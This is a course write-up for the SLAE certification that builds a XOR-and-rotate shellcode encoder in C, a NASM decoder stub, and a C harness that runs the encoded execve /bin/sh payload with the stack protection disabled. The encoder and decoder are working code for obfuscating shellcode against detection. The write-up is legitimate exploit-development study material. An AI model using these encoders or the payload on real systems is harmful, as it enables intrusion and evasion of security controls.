# Assignment 4

## What to do
- Create a custom encoding scheme
- PoC with using execve-stack as the shellcode to encode with the produced schema and execute

## How to do it

The custom encoding schema created on this post is based on xor and rotate.

##### Encoding

The encoder operates on a given shellcode placed in the buffer named _shellcode_ and a given byte - key.

Starting from the first byte of the shellcode, it is xor-ed with the byte - key. The next shellcode byte is xored with the right rotated key - byte. This process takes place until all the bytes of the shellcode are encoded.

```c
#include<stdio.h>
#include<stdint.h>
#include<stdlib.h>

int main(int argc, char **argv)
{
	// execve shellcode
	uint8_t *shellcode =
		"\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68"		// execve /bin/sh shellode
		"\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"; 	//

	uint8_t key = '\x6d';	// encoding key
	uint8_t *newshell;
	int i, length=0;

	// length of shellcode
	i=0;
	while (shellcode[i++] != '\0')
		length++;

	// allocate memory for the encoded shellcode
	newshell = (uint8_t *)malloc(sizeof(uint8_t)*length);

	// make the encoding
	// xor shellcode byte with key and then right rotate the key
	for (i=0; i < length; i++)
	{
		newshell[i] = shellcode[i] ^ key;	// xor shellcode byte with key
		key = ((key >> 1) | (key << 7));	// right rotate the key
	}

	printf("[+] Length of the encoded shellcode including key: %d bytes\n", length+1);
	printf("[+] Encoded shellcode and key:\n");

	// print the encoded shellcode
	printf("\t");
	for (i=0; i<length; i++)
	{
		printf("0x%02x", newshell[i]);
		if (i != length-1)
			printf(",");
	}

	// at the end of the encoded shellcode, place the encoding key
	printf(",0x%02x\n", key);

	return 0;

}
```

The code above can be found in _Assignement #4_ repo and is named as _encoder.c_

It can be compiled using `gcc -o encoder encoder.c`

The encoder can be easily modified in order to encode a different payload with a different key. For this purpose, another payload can be loaded in the buffer named _shellcode_ and another key in the variable named _key_.

##### Decoding

The decoding process begins in reverse order with rotating left the key byte and xor-ing it with the last byte of the shellcode. After that the key is rotated left and xored with the next byte of the shellcode. This process continues until the first byte of the shelloce is decoded.

```assembly
global _start

section .text
_start:

	jmp short call_shellcode

decoder:

	pop esi				; pointer to the begining of the shellcode
	xor ecx, ecx			; clear ecx
	mul ecx				; clear edx, eax
	lea edx, [esi+0x14]		; counter - pointer to the end of the shellcode
	mov al, byte [edx+0x1]		; mov the key(6b) into ecx - key located at the end of EncodedShellcode

decode:

	rol al, 1			; left rotate (calculate previous key)
	mov bl, al			; store key into ebx
	xor bl, [edx]			; xor to decode the encoded byte
	mov byte [edx], bl		; store decoded byte into memory
	cmp esi, edx			; is it the last byte of our shellcode?
	jz short EncodedShellcode	; jump to decoded shellcode
	dec edx				; decrement counter
	jmp short decode		; continue the decoding

call_shellcode:

	call decoder
	EncodedShellcode: db 0x5c,0x7f,0xac,0x4c,0x86,0x03,0xdb,0xf5,0x1e,0xde,0x33,0x82,0xf9,0x09,0xdc,0x53,0x8e,0x06,0x50,0x60,0x56,0x6b

```

The Assembly code can be compiled using the following commands respectively:
```zsh
$ nasm -f elf -o shell.o shell.asm
$ ld -o shell shell.o
```

Next step is to extract the actual shellcode from the elf file using this one-liner command:
```zsh
$ objdump -d ./shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```
found in [commandlinefu.com](http://www.commandlinefu.com)

The extracted bytes are:
```
"\xeb\x1a\x5e\x31\xc9\xf7\xe1\x8d\x56\x14\x8a\x42\x01\xd0\xc0"
"\x88\xc3\x32\x1a\x88\x1a\x39\xd6\x74\x08\x4a\xeb\xf1\xe8\xe1"
"\xff\xff\xff\x5c\x7f\xac\x4c\x86\x03\xdb\xf5\x1e\xde\x33\x82"
"\xf9\x09\xdc\x53\x8e\x06\x50\x60\x56\x6b"
```

The following code can be used to create the elf file in order to test the decoder. The shellcode must be placed in the shellcode buffer:
```c
#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = \
"\xeb\x1a\x5e\x31\xc9\xf7\xe1\x8d\x56\x14\x8a\x42\x01\xd0\xc0"
"\x88\xc3\x32\x1a\x88\x1a\x39\xd6\x74\x08\x4a\xeb\xf1\xe8\xe1"
"\xff\xff\xff\x5c\x7f\xac\x4c\x86\x03\xdb\xf5\x1e\xde\x33\x82"
"\xf9\x09\xdc\x53\x8e\x06\x50\x60\x56\x6b"

main()
{

        printf("Shellcode Length:  %d\n", strlen(shellcode));

        int (*ret)() = (int(*)())shellcode;

        ret();

}
```

The code above can be found in _Assignement #4_ repo and is named as _shell.c_

The shellcode can be compiled using `gcc -fno-stack-protector -z execstack shell.c -o shell`

The execution of the elf shellcode provided the two arguments, will spawn an sh shell.

/image

## Statement
This page has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student-ID: SLAE-998
